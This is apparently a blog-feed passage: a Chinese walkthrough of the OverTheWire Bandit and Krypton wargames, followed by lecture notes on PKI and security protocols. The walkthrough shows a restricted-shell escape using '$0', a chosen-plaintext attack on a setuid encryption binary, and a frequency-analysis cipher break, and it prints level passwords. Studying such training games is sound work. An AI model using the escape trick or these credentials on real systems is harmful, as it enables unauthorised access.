then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay!WELCOME TO THE UPPERCASE SHELL&gt;&gt; #!/bin/sh&gt;&gt; bashsh: 1: BASH: not found&gt;&gt; mansh: 1: MAN: not found&gt;&gt; shsh: 1: SH: not found&gt;&gt; $0$ lsuppershell$ iduid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)$ pwd/home/bandit32$ cat /etc/bandit_pass/bandit32cat: /etc/bandit_pass/bandit32: Permission denied$ cat /etc/bandit_pass/bandit33c9c3199ddf4121b10cf581a98d51caee$ 这关是真的骚，Linux中大小写严格区分，导致我们的命令都执行不了 后来看题解得知$0可以直接进入sh，然后就可以了woc 还有一个题解是利用ssh协议，传一个bash脚本(如下)，放在tmp文件夹下，用大写文件名./TEST逃逸，然后执行bash，不过还是没有上面这个办法简单暴力 12#!/bin/bashbash level 34123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101bl@bl-virtual-machine:~/wargame$ ssh bandit33@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit33@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay!bandit33@bandit:~$ lsREADME.txtbandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game!At this moment, there are no more levels to play in this game. However, we are constantly workingon new levels and will most likely expand this game with more levels soon.Keep an eye out for an announcement on our usual communication channels!In the meantime, you could play some of our other wargames.If you have an idea for an awesome new level, please let us know!bandit33@bandit:~$ 只有一个README.txt，恭喜完结撒花 截图纪念一下 以下是后面找到的一些题解 https://blog.csdn.net/winkar/article/details/38408873?locationNum=5&amp;fps=1 https://www.freebuf.com/column/181443.html https://www.jianshu.com/p/bf8cc6b0efd1 Krypton SSH InformationHost: krypton.labs.overthewire.orgPort: 2222 level 01234Welcome to Krypton! The first level is easy. The following string encodes the password using Base64:S1JZUFRPTklTR1JFQVQ=Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2222. You can find the files for other levels in /krypton/ 啊这熟悉的开头，简单的base64编码 1KRYPTONISGREAT 解码得到如上flag 123456789101112131415161718192021222324252627282930$ ssh krypton1@krypton.labs.overthewire.org -p 2222The authenticity of host '[krypton.labs.overthewire.org]:2222 ([176.9.9.172]:2222)' can't be established.ECDSA key fingerprint is SHA256:SCySwNrZFEHArEX1cAlnnaJ5gz2O8VEigY9X80nFWUU.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '[krypton.labs.overthewire.org]:2222,[176.9.9.172]:2222' (ECDSA) to the list of known hosts. _ _| | ___ __ _ _ _ __ | |_ ___ _ __| |/ / '__| | | | '_ \| __/ _ \| '_ \| &lt;| | | |_| | |_) | || (_) | | | ||_|\_\_| \__, | .__/ \__\___/|_| |_| |___/|_|a http://www.overthewire.org wargame.krypton1@krypton.labs.overthewire.org's password:Permission denied, please try again.krypton1@krypton.labs.overthewire.org's password:Permission denied, please try again.krypton1@krypton.labs.overthewire.org's password:Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64) * Documentation: https://help.ubuntu.com/The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.krypton1@krypton:~$ 成功连上level1 level 112345678910111213141516171819202122232425262728293031323334353637383940krypton1@krypton:~$ ls -altotal 24drwxr-xr-x 3 krypton1 krypton1 4096 Feb 27 11:03 .drwxr-xr-x 10 root root 4096 Feb 27 11:03 ..-rw-r--r-- 1 krypton1 krypton1 220 Apr 9 2014 .bash_logout-rw-r--r-- 1 krypton1 krypton1 3637 Apr 9 2014 .bashrcdrwx------ 2 krypton1 krypton1 4096 Feb 27 11:03 .cache-rw-r--r-- 1 krypton1 krypton1 675 Apr 9 2014 .profilekrypton1@krypton:~$ cd /krypton/krypton1@krypton:/krypton$ lskrypton1 krypton2 krypton3 krypton4 krypton5 krypton6krypton1@krypton:/krypton$ ls krypton1README krypton2krypton1@krypton:/krypton$ cat krypton1/READMEWelcome to Krypton!This game is intended to give hands on experience with cryptographyand cryptanalysis. The levels progress from classic ciphers, to modern,easy to harder.Although there are excellent public tools, like cryptool,to performthe simple analysis, we strongly encourage you to try and do thesewithout them for now. We will use them in later excercises.** Please try these levels without cryptool first **The first level is easy. The password for level 2 is in the file'krypton2'. It is 'encrypted' using a simple rotation called ROT13.It is also in non-standard ciphertext format. When using alpha characters forcipher text it is normal to group the letters into 5 letter clusters,regardless of word boundaries. This helps obfuscate any patterns.This file has kept the plain text word boundaries and carried them tothe cipher text.Enjoy!krypton1@krypton:/krypton$ cat krypton1/krypton2YRIRY GJB CNFFJBEQ EBGGRAkrypton1@krypton:/krypton$ 通过README可知，简单的ROT13加密 1LEVEL TWO PASSWORD ROTTEN 进入下一关 level 212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576krypton2@krypton:~$ lskrypton2@krypton:~$ cd /krypton/krypton2@krypton:/krypton$ cd krypton2krypton2@krypton:/krypton/krypton2$ lsREADME encrypt keyfile.dat krypton3krypton2@krypton:/krypton/krypton2$ cat READMEKrypton 2ROT13 is a simple substitution cipher.Substitution ciphers are a simple replacement algorithm. In this exampleof a substitution cipher, we will explore a 'monoalphebetic' cipher.Monoalphebetic means, literally, "one alphabet" and you will see why.This level contains an old form of cipher called a 'Caesar Cipher'.A Caesar cipher shifts the alphabet by a set number. For example:plain: a b c d e f g h i j k ...cipher: G H I J K L M N O P Q ...In this example, the letter 'a' in plaintext is replaced by a 'G' in theciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext.The password for level 3 is in the file krypton3. It is in 5 lettergroup ciphertext. It is encrypted with a Caesar Cipher. Without anyfurther information, this cipher text may be difficult to break. You donot have direct access to the key, however you do have access to a programthat will encrypt anything you wish to give it using the key.If you think logically, this is completely easy.One shot can solve it!Have fun.Additional Information:The `encrypt` binary will look for the keyfile in your current workingdirectory. Therefore, it might be best to create a working direcory in /tmpand in there a link to the keyfile. As the `encrypt` binary runs setuid`krypton3`, you also need to give `krypton3` access to your working directory.Here is an example:krypton2@melinda:~$ mktemp -d/tmp/tmp.Wf2OnCpCDQkrypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.datkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ lskeyfile.datkrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 .krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issuekrypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ lsciphertext keyfile.datkrypton2@krypton:/krypton/krypton2$krypton2@krypton:/krypton/krypton2$ mktemp -d/tmp/tmp.fz9I1hQd5dkrypton2@krypton:/krypton/krypton2$ cd /tmp/tmp.fz9I1hQd5dkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ lskeyfile.datkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ chmod 777 .krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /etc/issue krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ lsciphertext keyfile.datkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext GNGZFGXFEZXkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat keyfile.dat cat: keyfile.dat: Permission deniedkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls -altotal 12drwxrwxrwx 2 krypton2 krypton2 4096 Feb 27 11:19 .drwxrwx-wt 3 root root 4096 Feb 27 11:20 ..-rw-rw-r-- 1 krypton3 krypton2 11 Feb 27 11:19 ciphertextlrwxrwxrwx 1 krypton2 krypton2 29 Feb 27 11:18 keyfile.dat -&gt; /krypton/krypton2/keyfile.datkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ 将密文GNGZFGXFEZX进行凯撒位移 1234567891011121314151617181920212223242526HOHAGHYGFAYIPIBHIZHGBZJQJCIJAIHCAKRKDJKBJIDBLSLEKLCKJECMTMFLMDLKFDNUNGMNEMLGEOVOHNOFNMHFPWPIOPGONIGQXQJPQHPOJHRYRKQRIQPKISZSLRSJRQLJTATMSTKSRMKUBUNTULTSNLVCVOUVMUTOMWDWPVWNVUPNXEXQWXOWVQOYFYRXYPXWRPZGZSYZQYXSQAHATZARZYTRBIBUABSAZUSCJCVBCTBAVTDKDWCDUCBWUELEXDEVDCXVFMFYEFWEDYWGNGZFGXFEZX 发现果然好像没有可读的，再看看README原来这是个示例（我好蠢 12345678910111213141516171819202122krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat /etc/issueUbuntu 14.04.5 LTS \n \lkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/krypton3 /krypton/krypton2/krypton3krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ ls /krypton/krypton2/ -altotal 32drwxr-xr-x 2 root root 4096 Nov 4 05:21 .drwxr-xr-x 8 root root 4096 Nov 4 05:21 ..-rw-r----- 1 krypton2 krypton2 1815 Nov 4 05:21 README-rwsr-x--- 1 krypton3 krypton2 8970 Nov 4 05:21 encrypt-rw-r----- 1 krypton3 krypton3 27 Nov 4 05:21 keyfile.dat-rw-r----- 1 krypton2 krypton2 13 Nov 4 05:21 krypton3krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ lsciphertext keyfile.datkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ rm -f ciphertext krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ /krypton/krypton2/encrypt /krypton/krypton2/krypton3 krypton2@krypton:/tmp/tmp.fz9I1hQd5d$ lsciphertext keyfile.datkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ cat ciphertext AYCQYPGQCYQWkrypton2@krypton:/tmp/tmp.fz9I1hQd5d$ 重新用krypton3被加载，解密，得到CAESARISEASY 1234567891011121314151617181920212223242526BZDRZQHRDZRXCAESARISEASYDBFTBSJTFBTZECGUCTKUGCUAFDHVDULVHDVBGEIWEVMWIEWCHFJXFWNXJFXDIGKYGXOYKGYEJHLZHYPZLHZFKIMAIZQAMIAGLJNBJARBNJBHMKOCKBSCOKCINLPDLCTDPLDJOMQEMDUEQMEKPNRFNEVFRNFLQOSGOFWGSOGMRPTHPGXHTPHNSQUIQHYIUQIOTRVJRIZJVRJPUSWKSJAKWSKQVTXLTKBLXTLRWUYMULCMYUMSXVZNVMDNZVNTYWAOWNEOAWOUZXBPXOFPBXPVAYCQYPGQCYQW 得到flag进入下一关 level 31234567891011121314151617181920212223242526272829303132333435363738394041krypton3@krypton:~$ lskrypton3@krypton:~$ cd /krypton/krypton3krypton3@krypton:/krypton/krypton3$ lsHINT1 HINT2 README found1 found2 found3 krypton4krypton3@krypton:/krypton/krypton3$ cat README Well done. You've moved past an easy substitution cipher.Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop.The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exerciseyou were able to introduce arbitrary plaintext to exposethe key. In this example, the cipher mechanism is not available to you, the attacker.However, you have been lucky. You have intercepted morethan one message. The password to the next level is foundin the file 'krypton4'. You have also found 3 other files.(found1, found2, found3)You know the following important details:- The message plaintexts are in English (*** very important)- They were produced from the same key (*** even better!)Enjoy.krypton3@krypton:/krypton/krypton3$ cat found1CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU krypton3@krypton:/krypton/krypton3$ cat found2QVJDB MEDGB QJJSG WQGZS NSZBN WUXBN JDSYS NCBWU MNICI STBUJ ACBEN QYDSN UQENS SJDQJ UDQFS UYSQN SKQUS WMZQJ SWQJJ DSFCG EUGSK UZDBB VCGUJ NQJXB NWQXN SSUZD BBVZD QNJSN SWCGQ ABMJQ HMQNJ SNBXQ TCVSX NBTDC UDBTS ENQTT QNUZD BBVUI QNCSW CGHMQ VCJLW MNCGE JDSSV CPQAS JDQGS NQAMJ JDSZM NNCZM VMTKQ UWCZJ QJSWA LVQKJ DNBME DBMJS GEVQG WQGWJ DSUZD BBVKB MVWDQ ISYNB ICWSW QGCGJ SGUCI SSWMZ QJCBG CGVQJ CGENQ TTQNQ GWJDS ZVQUU CZUQJ JDSQE SBXUD QFSUY SQNST QNNCS WJDSL SQNBV WQGGS DQJDQ KQLJD SZBGU CUJBN LZBMN JBXJD SWCBZ SUSBX KBNZS UJSNC UUMSW QTQNN CQESV CZSGZ SBGGB ISTAS NJKBB XDQJD QKQLU GSCED ABMNU YBUJS WABGW UJDSG SOJWQ LQUUM NSJLJ DQJJD SNSKS NSGBC TYSWC TSGJU JBJDS TQNNC QESJD SZBMY VSTQL DQISQ NNQGE SWJDS ZSNST BGLCG UBTSD QUJSU CGZSJ DSKBN ZSUJS NZDQG ZSVVB NQVVB KSWJD STQNN CQESA QGGUJ BASNS QWBGZ SCGUJ SQWBX JDSMU MQVJD NSSJC TSUQG GSUYN SEGQG ZLZBM VWDQI SASSG JDSNS QUBGX BNJDC UUCOT BGJDU QXJSN JDSTQ NNCQE SUDSE QISAC NJDJB QWQME DJSNU MUQGG QKDBK QUAQY JCUSW BGTQL JKCGU UBGDQ TGSJQ GWWQM EDJSN RMWCJ DXBVV BKSWQ VTBUJ JKBLS QNUVQ JSNQG WKSNS AQYJC USWBG XSANM QNLDQ TGSJW CSWBX MGFGB KGZQM USUQJ JDSQE SBXQG WKQUA MNCSW BGQME MUJQX JSNJD SACNJ DBXJD SJKCG UJDSN SQNSX SKDCU JBNCZ QVJNQ ZSUBX UDQFS UYSQN SMGJC VDSCU TSGJC BGSWQ UYQNJ BXJDS VBGWB GJDSQ JNSUZ SGSCG ASZQM USBXJ DCUEQ YUZDB VQNUN SXSNJ BJDSL SQNUA SJKSS GQGWQ UUDQF SUYSQ NSUVB UJLSQ NUACB ENQYD SNUQJ JSTYJ CGEJB QZZBM GJXBN JDCUY SNCBW DQISN SYBNJ SWTQG LQYBZ NLYDQ VUJBN CSUGC ZDBVQ UNBKS UDQFS UYSQN SUXCN UJACB ENQYD SNNSZ BMGJS WQUJN QJXBN WVSES GWJDQ JUDQF SUYSQ NSXVS WJDSJ BKGXB NVBGW BGJBS UZQYS YNBUS ZMJCB GXBNW SSNYB QZDCG EQGBJ DSNSC EDJSS GJDZS GJMNL UJBNL DQUUD QFSUY SQNSU JQNJC GEDCU JDSQJ NCZQV ZQNSS NTCGW CGEJD SDBNU SUBXJ DSQJN SYQJN BGUCG VBGWB GRBDG QMANS LNSYB NJSWJ DQJUD QFSUY SQNSD QWASS GQZBM GJNLU ZDBBV TQUJS NUBTS JKSGJ CSJDZ SGJMN LUZDB VQNUD QISUM EESUJ SWJDQ JUDQF SUYSQ NSTQL DQISA SSGST YVBLS WQUQU ZDBBV TQUJS NALQV SOQGW SNDBE DJBGB XVQGZ QUDCN SQZQJ DBVCZ VQGWB KGSNK DBGQT SWQZS NJQCG KCVVC QTUDQ FSUDQ XJSCG DCUKC VVGBS ICWSG ZSUMA UJQGJ CQJSU UMZDU JBNCS UBJDS NJDQG DSQNU QLZBV VSZJS WQXJS NDCUW SQJDkrypton3@krypton:/krypton/krypton3$ cat found3 DSNSM YBGVS ENQGW QNBUS KCJDQ ENQIS QGWUJ QJSVL QCNQG WANBM EDJTS JDSAS SJVSX NBTQE VQUUZ QUSCG KDCZD CJKQU SGZVB USWCJ KQUQA SQMJC XMVUZ QNQAQ SMUQG WQJJD QJJCT SMGFG BKGJB GQJMN QVCUJ UBXZB MNUSQ ENSQJ YNCPS CGQUZ CSGJC XCZYB CGJBX ICSKJ DSNSK SNSJK BNBMG WAVQZ FUYBJ UGSQN BGSSO JNSTC JLBXJ DSAQZ FQGWQ VBGEB GSGSQ NJDSB JDSNJ DSUZQ VSUKS NSSOZ SSWCG EVLDQ NWQGW EVBUU LKCJD QVVJD SQYYS QNQGZ SBXAM NGCUD SWEBV WJDSK SCEDJ BXJDS CGUSZ JKQUI SNLNS TQNFQ AVSQG WJQFC GEQVV JDCGE UCGJB ZBGUC WSNQJ CBGCZ BMVWD QNWVL AVQTS RMYCJ SNXBN DCUBY CGCBG NSUYS ZJCGE CJkrypton3@krypton:/krypton/krypton3$ cat HINT1Some letters are more prevalent in English than others.krypton3@krypton:/krypton/krypton3$ cat HINT2"Frequency Analysis" is your friend.krypton3@krypton:/krypton/krypton3$ krypton3@krypton:/krypton/krypton3$ https://www.jianshu.com/p/a131136c0dbf 123456789101112131415161718192021222324252627# 25char257: (space)155: S107: C106: Q102: J100: U87: B81: G74: N69: D57: Z56: V47: W42: Y32: T29: X29: M27: L25: K20: A17: E11: F7: O2: I2: H1: R 12345678910111213141516171819202122232425262728# 26char354: (space)243: S186: Q158: J135: N130: U129: B119: D111: G86: C66: W59: Z53: V45: M37: T34: E33: Y33: X30: K27: L26: A14: I12: F3: O2: R2: H1: P 123456789101112131415161718192021222324252627# 25char93: (space)58: S48: Q41: J35: G34: C31: N30: B27: U22: D21: V16: Z16: W13: E12: M12: K9: Y9: X9: A6: T6: L5: F3: I2: O1: R1: P 假如把所有综合一起统计 123456789101112131415161718192021222324252627703: (space)456: S:e340: Q:t301: J:a257: U:o246: B:i240: N:n227: G:s227: C:h210: D:r132: Z:d130: V:l129: W:c86: M:u84: Y:m75: T:w71: X:f67: K:g64: E:y60: L:p55: A:b28: F:v19: I:k12: O:j4: R:x4: H:q2: P:z 把上述词频带入解开，貌似也不是密码啊 123krypton3@krypton:/krypton/krypton3$ cat krypton4 KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS gellc isear eleke lfiun mtoog incho bnuae http://www.richkni.co.uk/php/crypta/freq.php http://www.simonsingh.net/The_Black_Chamber/hintsandtips.html 我疯了，做法没问题，但据说只能一个个试，直接找到了题解 12secret: A B C D E F G H I J K L M N O P Q R S T U V W X Y Ztext: B O I H G K N Q V T W Y U R X Z A J E M S L D F P C 用命令替换得到密码 1$ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]' 123krypton3@krypton:/krypton/krypton3$ cat krypton4 | tr '[A-Z]' '[BOIHGKNQVTWYURXZAJEMSLDFPC]'WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE krypton3@krypton:/krypton/krypton3$]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>wargame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Security-Protocols-and-Standards]]></title>
    <url>%2F2020%2F02%2F03%2FSecurity-Protocols-and-Standards%2F</url>
    <content type="text"><![CDATA[Security Protocols and Standards–PKI Principles and technology安全协议与标准 PKI concepts/content/significance Core PKI Service Certificate and CRL(证书吊销列表) Trust Model PKCS：The Public-Key Cryptography Standards CA(证书认证中心：Certificate Authority) Standards PKI Security Protocols：SMIME，SSL，SET(安全电子交易协议)，VPN PKI/CA Design and Implementation Related Laws * Bitcoin &amp; BlockChain 1.Review to Cryptography Security Requirment(安全需求) Confidentiality(机密性)：防止被未授权人员读取信息 Integrity(完整性)：保持数据一致完整 Availability(可用性)：保持数据可用 Authentication(认证性)：保证人的身份正确 Non-repudiation(抗抵赖性)：确保数据不会被否定 Access control(访问控制)：防止未授权人员访问 前三个被称为信息安全的CIA三要素 攻击的类型 攻击分为两种类型：主动攻击和被动攻击 被动攻击(Passive attack)：只能观察到流量或数据 主动攻击(Active attack)：可以主动修改流量或数据，比如中间人攻击。通常比较难实现，但是攻击十分有效，比如邮件的伪造，TCP/IP spoofing（IP欺骗），session hijacking（会话劫持） 安全服务ISO7498-2中定义了5大类可选的安全服务： 认证性 访问控制 数据保密性 数据完整性 不可否认性 安全机制三大基本设施 Encryption(加密) Digital signatures(数字签名) Checksums/hash algorithm(校验码/哈希算法) 一种安全服务可能结合多种安全机制 Security Protocol 一种安全协议里包含一个或多个安全服务，而安全服务提供多种安全机制，在一个安全机制里可能用到多种算法（机制由算法实现），这就是协议与服务、机制、算法之间的关系 对称加密由加密过程可分为：流加密(Stream cipher)和块加密(Block cipher) Key Distribution Center(KDC)：密钥分发中心 块加密方式 Electronic Code Book(ECB) Cipher Block Chain(CBC) Cipher Feed Back(CFB) Output Feed Back(OFB) Counter(CTR) 公钥应用 加解密 数字签名 密钥交换 算法 RSA DH：key exchange algorithm Elgamal DSA 对称加密vs非对称加密对称加密 优点 速度快、处理量大，适用于对应用数据的直接加密 加密密钥长度短，一般为40bit至128bit 还可以构造各种加密体制，如产生伪随机数、hash函数 缺点 密钥在双方都要一致、保密，传递较难 大型网络中密钥量大，难以管理，一般需要TTP 密钥需要经常更换 非对称加密 优点 只有私钥保密，公钥公开 网络上的密钥管理只需要一个功能性TTP，而不是一个绝对安全的TTP，不需在线，可以离线 密钥生命周期相对较长 许多公钥方案可以产生数字签名机制 在大型网络上，所需的密钥相对较少 缺点 速度慢、处理量少，适用于密钥交换 密钥长度相对较长 安全性没有得到理论性证明 历史较短 哈希函数弱碰撞：给定x，寻找y，使得H(y) = H(x) 强碰撞：寻找x，y，使得H(y) = H(x) Message Authertication Code(MAC)消息认证码MAC 数字签名（Digital Signature）Key Management密码学最难的部分 密钥分为两种 Short-term session keys(ephemeral keys) Long-term keys 认证 加密 主要问题 Distributing keys(分发密钥) 获取其他人的公钥 分发自己的公钥 Establishing a shared key with another party(与另一方建立共享密钥) 保密性 认证性 Key storage 安全存储密钥 Revocation Revoking published keys：撤销公钥 Determining whether a published key is still valid：验证公钥的可用性 Key Lifetime and Key Compromise公钥有着更长的生命周期(decades) 私钥或者传统密钥有着更短的生命周期(a year or two) Key Distribution Problem！中间人攻击 解决办法：CA（Certification authority） 对称加密密钥管理认证：KDC/KEY DISTRIBUTION CENTER 非对称加密密钥管理认证：CA/CERTIFICATE AUTHORITY Data Format一种正确的加密内容的格式如下图所示 PGP和S/MIME，SSL，SSH的格式不同于他们的 bit-bagging format Security Protocol：Layers层次越高，就越容易部署应用；层次越低，数据就越透明 PKI（Public Key Infrastructure）Internet安全系统解决方案，PKI采用数字证书机制管理公钥，通过第三方可信机构CA，把用户的公钥和身份信息进行有效捆绑，在Internet上有效验证用户的身份 国际标准PKIX：系统化、标准化 PKIX系列标准(Public Key Infrastructure on X.509)是由因特网网络工程技术小组的PKI小组制定，PKIX的标准化是建立互操作的基础。标准主要定义基于X.509的PKI框架模型，并以RFC形式发布 安全：可靠性==》可靠性（网课的可靠性和安全性，没有可靠性，安全性没用） 安全协议与标准 协议：至少两方参与 网络协议的三要素：语法、语义、同步 围绕PKI的相关协议和理论 PKI：安全基础设施：Public Key Infrastructure 基础设施协议 应用的协议 参考书： PKI技术，荆继武，冯登国，科学出版社（偏理论 PKI原理与技术，谢冬青，清华大学出版社 PKI/CA与数字证书技术大全，张明德，刘伟，电子工业出版社（偏实践 可靠性和安全性的区别，其两者之间的包含性 面对问题需要系统的方法 环境安全 物理安全 物理网路 平台可靠性 安全——木桶理论 安全：生态的概念 蝴蝶效应 黑天鹅理论 CIA三定理 被动攻击&amp;主动攻击 被动攻击：可以监控数据 主动攻击：可以修改数据 属性证书 身份证书 两者结合解决身份认证问题 协议：至少两方，交互信息、有限交互 怎么打padding 公钥算法的功能 加解密：保密性 数字签名：认证性 密钥交换：密钥管理 RSA：数字签名加解密 DH：密钥交换 Elgamal DSA：基于离散对数的 椭圆曲线]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
